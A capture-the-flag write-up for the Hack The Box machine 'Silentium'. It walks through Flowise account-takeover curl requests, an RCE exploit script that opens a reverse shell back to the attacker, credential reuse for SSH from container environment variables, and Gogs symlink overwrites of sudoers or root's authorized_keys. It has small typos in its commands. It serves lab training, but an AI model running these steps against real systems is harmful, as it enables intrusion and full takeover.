Writeup — Silentium (HTB)
Machine: Silentium
IP: <ATT-IP>
OS: Ubuntu 24.04.4 LTS (host) + Alpine Linux 3.22 (Docker container)
Difficulty: Hard

1. Initial Recon
Start with a port scan:

namp -p- --min-rate 5000 -T4 <ATT-IP>

We find:

22/tcp -- SSH (OpenSSH)
80/tcp -- nginx (reverse proxy)

Add the domain to /etc/hosts:

echo "<ATT-IP> silentium.htb" | sudo tee -a /etc/hosts

Browsing the site shows a redirect to a subdomain. Fuzz for vhosts:

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs <default_size>

We find:

staging.silentium.htb -- Flowise login panel
staging-v2-code.dev.silentium.htb -- discovered later (Gogs)

Add to /etc/hosts:

echo "<ATT-IP> staging.silentium.htb" | sudo tee -a /etc/hosts

2. Flowise Enumeration
Navigating to http://staging.silentium.htb/ -- we see Flowise (login panel, /signin).

Check the version:

curl -s http://staging.silentium.htb/api/v1/version
# {"version":"3.0.5"}

Flowise 3.0.5 -- vulnerable to two CVEs:

CVE-2025-58434 -- unauthenticated account takeover (forgot-password returns token)
CVE-2025-59528 -- authenticated RCE via CustomMCP node

Fixed in: 3.0.6

Analyze the JS bundle to find the API structure and the user email:

curl -s http://staging.silentium.htb/assets/index-C6GaKUTA.js -o bundle.js
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\^[a-zA-Z]{2,}' bundle.js | sort -u

Find email: ben.silentium.htb

Test the forgot-password endpoint -- payload must be wrapped in user:

curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'

Response contains a reset token -- CVE-2025-58434 confirmed.

3. Account Takeover -- CVE-2025-58434
Reset Ben's password:

curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","password":"Pwn3d!2026","token":"<TOKEN>"}}'

Log into the UI as ben.silentium.htb / Pwn3d!2026 at http://staging.silentium.htb/signin.

Navigate to /apikey and copy the API key.

4. RCE in Flowise Container -- CVE-2025-59528
The CustomMCP node passes user input directly to Function() in Node.js -> RCE.

Using the ready-made flowise_chain.py exploit:

python3 flowise_chain.py -t http://staging.silentium.htb \
  --api-key <KEY> \
  --lhost <MY-IP> \
  --lport 4444

Catch the reverse shell:

nc -lvnp 4444
# uid=0(root) gid=0(root)

We are root inside the Docker container -- but that is not the end, because root.txt is not in the container's /root (confirmed: cat /root/root.txt -> No such file or directory).

Confirm we are in a container:

ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 .dockerenv

5. Container Enumeration
Check environment variables:

env

We find:

FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_HOST=mailhog
SMTP_USER=test
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
DATABASE_PATH=/root/.flowise
SECRETKEY_PATH=/root/.flowise

Key takeaways:

SENDER_EMAIL=ben.silentium.htb -> SSH login: ben
SMTP_PASSWORD=r04D!!_R4ge -> password for reuse
SMTP_HOST=mailhog -> second container

Check capabilities:

cat /proc/self/status | grep Cap
# CapEff: 00000000a00425fb -- no CAP_SYS_ADMIN

Container escape via mount / privileged not possible.

Check the Flowise database:

strings /root/.flowise/database.sqlite | grep -iE 'HTB|flag|password'
# only Ben's data

No flag.

6. SSH to Host
With ben + r04D!!_R4ge, try SSH:

ssh ben@<ATT-IP>
# password: r04D!!_R4ge

It works! We are on the Ubuntu 24.04 host:

id
# uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
hostname
# silentium

sudo -l -> no permissions. Standard SUIDs (nothing interesting).

7. Host Enumeration
Check nginx:

ls -la /etc/nginx/sites-enabled/
cat /etc/nginx/sites-enabled/staging-v2-code

We find:

server {
    listen 80;
    server_name staging-v2-code.dev.silentium.htb;
    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        ...
    }
}

Gogs is running on 127.0.0.1:3001 (closed from outside). Nginx reverse-proxies it.

Check processes:

ps aux | grep -v '^\[' | grep root

We find:

root 1494 ... /opt/gogs/gogs/gogs web
root 1586 ... /usr/bin/dockerd -H fd:// ...
root 1922 ... node /usr/local/bin/flowise start

Gogs runs as root -- key information.

Check the docker socket:

ls -la /var/run/docker.sock
# srw-rw---- 1 root docker
groups
# ben users -- NOT in docker group

Docker socket not exploitable.

8. Gogs Access via nginx
Add the subdomain to hosts:

echo "<ATT-IP> staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts

Open in browser:

http://staging-v2-code.dev.silentium.htb/

We see Gogs -- with Register enabled (open registration).

Register an account:

Username: test
Password: test

Log in and generate a Personal Access Token:

http://staging-v2-code.dev.silentium.htb/user/settings/applications
Token: 1eeade7cf7de67c021c7c3b714273453695f91e1
9. RCE via CVE-2025-8110 (Gogs)
Gogs <= 0.13.3 -- path traversal via symlink in the API PUT /api/v1/repos/.../contents/.

Mechanism:

Gogs API follows symlinks without validation
Create a symlink in a repo -> /etc/sudoers.d/ben (or .git/config, or authorized_keys)
Use the API to overwrite the symlink's content
Gogs (running as root) writes the file with root privileges

Effect: arbitrary file write as root -> instant root.

Variant A -- sudoers (recommended)
Overwrite /etc/sudoers.d/ben with:

ben ALL=(ALL) NOPASSWD:ALL

Then over SSH:

sudo su
# root
cat /root/root.txt

Variant B -- authorized_keys
Overwrite /root/.ssh/authorized_keys with your public key:

ssh-keygen -t ed25519 -f /tmp/root_key -N ""
# inject /tmp/root_key.pub via symlink
ssh -i /tmp/root_key root@silentium.htb
cat /root/root.txt
